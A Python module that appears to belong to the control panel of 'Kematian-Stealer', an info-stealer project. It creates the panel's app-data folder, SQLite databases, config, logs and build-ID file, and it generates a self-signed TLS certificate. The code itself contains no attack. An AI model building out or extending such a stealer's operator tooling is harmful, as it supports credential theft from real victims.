import os
import logging

from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from datetime import datetime, timedelta

from panel.ui.modules.settings.settings import Settings


class MakeFiles:
    """Sets up the necessary files and directories for the application to run properly."""

    def __init__(self) -> None:
        """Simply sets the appdir variable to the APPDATA environment variable."""
        self.appdir = os.getenv("APPDATA")
        self.directoryName = "Kematian-Stealer"
        self.logs_directory = "logs"

    def make_appdir_directory(self) -> None:
        """Makes the directory where all the files and directories will be stored."""

        if not os.path.exists(os.path.join(self.appdir, self.directoryName)):
            os.mkdir(os.path.join(self.appdir, self.directoryName))

    def get_appdir_directory(self) -> str:
        """Gets the directory where all the files and directories are stored.

        Returns:
            str: Returns the directory where all the files and directories are stored.
        """
        return os.path.join(self.appdir, self.directoryName)

    def makeSQLiteDB(self) -> None:
        """Makes the SQLite database file where all the data will be stored."""
        self.dbName = "kdot.db"
        self.dbPath = os.path.join(self.appdir, self.directoryName, self.dbName)
        if not os.path.exists(self.dbPath):
            with open(self.dbPath, "w") as f:
                f.write("")

    def get_SQLiteDB_path(self) -> str:
        """Method to get the path of the SQLite database file.

        Returns:
            str: Returns the path of the SQLite database file."""
        return os.path.join(self.appdir, self.directoryName, "kdot.db")

    def makeSQLiteDBGraphs(self) -> None:
        """Makes the SQLite database file where all the data will be stored."""
        self.dbName = "graphs.db"
        self.dbPath = os.path.join(self.appdir, self.directoryName, self.dbName)
        if not os.path.exists(self.dbPath):
            with open(self.dbPath, "w") as f:
                f.write("")

    def get_SQLiteDBGraphs_path(self) -> str:
        """Method to get the path of the SQLite database file.

        Returns:
            str: Returns the path of the SQLite database file."""
        return os.path.join(self.appdir, self.directoryName, "graphs.db")

    def make_config(self) -> None:
        """Makes the config file where all the settings will be stored."""
        settings = Settings()
        self.configName = "config.json"
        self.configPath = os.path.join(self.appdir, self.directoryName, self.configName)

        if not os.path.exists(self.configPath):
            with open(self.configPath, "w") as f:
                f.write("{}")
            settings.set_to_defaults()

    def get_config_file_path(self) -> str:
        """Gets the path of the config file.

        Returns:
            str: Returns the path of the config file.
        """
        return os.path.join(self.appdir, self.directoryName, "config.json")

    def make_logs_directory(self) -> None:
        """Makes the logs directory where all the logs will be stored."""
        if not os.path.exists(
            os.path.join(self.appdir, self.directoryName, self.logs_directory)
        ):
            os.mkdir(os.path.join(self.appdir, self.directoryName, self.logs_directory))

    def get_logs_directory(self) -> str:
        """Gets the logs directory where all the logs are stored.

        Returns:
            str: Returns the logs directory where all the logs are stored.
        """
        return os.path.join(self.appdir, self.directoryName, self.logs_directory)

    def make_build_ids_file(self) -> None:
        """Makes the build_ids file where all the build ids will be stored."""
        self.build_ids_file = "build_ids.json"
        if not os.path.exists(
            os.path.join(self.appdir, self.directoryName, self.build_ids_file)
        ):
            with open(
                os.path.join(self.appdir, self.directoryName, self.build_ids_file), "w"
            ) as f:
                f.write("{}")

    def get_build_ids_file_path(self) -> str:
        """Gets the path of the build_ids file.

        Returns:
            str: Returns the path of the build_ids file.
        """
        return os.path.join(self.appdir, self.directoryName, "build_ids.json")

    def fix_key_and_certs(self) -> None:
        """Fixes the key and certificate files if they are missing or corrupted."""
        keyfile_path = os.path.join(self.appdir, self.directoryName, "keyfile.pem")
        certfile_path = os.path.join(self.appdir, self.directoryName, "certfile.pem")

        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )

        public_key = private_key.public_key()

        # NOTE THIS SOFTWARE SHOULD ONLY BE USED ON YOUR MACHINES FOR RED TEAM TESTING
        subject = issuer = x509.Name(
            [
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Illilnois"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "Chicago"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Somali-Devs"),
                x509.NameAttribute(NameOID.COMMON_NAME, "sped.lol"),
            ]
        )

        certificate = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(public_key)
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.utcnow())
            .not_valid_after(datetime.utcnow() + timedelta(days=365))
            .add_extension(
                x509.SubjectAlternativeName([x509.DNSName("localhost")]),
                critical=False,
            )
            .sign(private_key, hashes.SHA256())
        )

        with open(keyfile_path, "wb") as f:
            f.write(
                private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption(),
                )
            )

        with open(certfile_path, "wb") as f:
            f.write(certificate.public_bytes(serialization.Encoding.PEM))

        logging.info("Private key and certificate have been generated and saved.")

    def get_key_path(self) -> str:
        """Gets the path of the key file.

        Returns:
            str: Returns the path of the key file.
        """
        return os.path.join(self.appdir, self.directoryName, "keyfile.pem")

    def get_cert_path(self) -> str:
        """Gets the path of the certificate file.

        Returns:
            str: Returns the path of the certificate file.
        """
        return os.path.join(self.appdir, self.directoryName, "certfile.pem")

    def make_map_db(self) -> None:
        """Makes the SQLite database file where all the data will be stored."""
        self.dbName = "map.db"
        self.dbPath = os.path.join(self.appdir, self.directoryName, self.dbName)
        if not os.path.exists(self.dbPath):
            with open(self.dbPath, "w") as f:
                f.write("")

    def get_map_db_path(self) -> str:
        """Method to get the path of the SQLite database file.

        Returns:
            str: Returns the path of the SQLite database file."""
        return os.path.join(self.appdir, self.directoryName, "map.db")

    def ensure_all_dirs(self) -> None:
        """Ensures that all the directories are present."""
        check_pairs = {
            self.get_appdir_directory(): self.make_appdir_directory,
            self.get_SQLiteDB_path(): self.makeSQLiteDB,
            self.get_config_file_path(): self.make_config,
            self.get_logs_directory(): self.make_logs_directory,
            self.get_build_ids_file_path(): self.make_build_ids_file,
            self.get_config_file_path(): self.make_config,
            self.get_map_db_path(): self.make_map_db,
        }

        logging.critical(
            r"Ensuring all directories are present!!! If any are missing the programn will attempt to create them but sometimes I'm a bad coder and I mess that up. If this is the case please delete the Kematian-Stealer folder in %appdir%"
        )

        for path, make_func in check_pairs.items():
            if not os.path.exists(path):
                make_func()
                logging.warning(f"Created {path}")
            else:
                logging.info(f"{path} already exists.")
